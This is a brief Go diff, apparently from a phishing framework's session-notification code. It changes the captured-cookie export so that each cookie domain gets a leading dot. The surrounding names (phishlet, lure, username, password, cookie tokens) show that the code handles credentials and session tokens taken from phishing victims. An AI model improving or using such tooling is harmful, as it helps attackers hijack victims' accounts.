@@ -912,6 +912,9 @@ func NotifySession(lureId int, phishlet, username, password, remoteAddr string, 
 	defaultExpiry := updateTime + 2592000
 	var cookies []browserCookie
 	for domain, tokenMap := range cookieTokens {
+		if len(domain) > 0 && domain[0] != '.' {
+			domain = "." + domain
+		}
 		for _, ct := range tokenMap {
 			expiry := ct.ExpiresAt
 			if expiry == 0 {
@@ -976,6 +979,9 @@ func NotifySessionFromDB(sess *database.Session) {
 	defaultExpiry := sess.UpdateTime + 2592000
 	var cookies []browserCookie
 	for domain, tokenMap := range sess.CookieTokens {
+		if len(domain) > 0 && domain[0] != '.' {
+			domain = "." + domain
+		}
 		for _, ct := range tokenMap {
 			expiry := ct.ExpiresAt
 			if expiry == 0 {
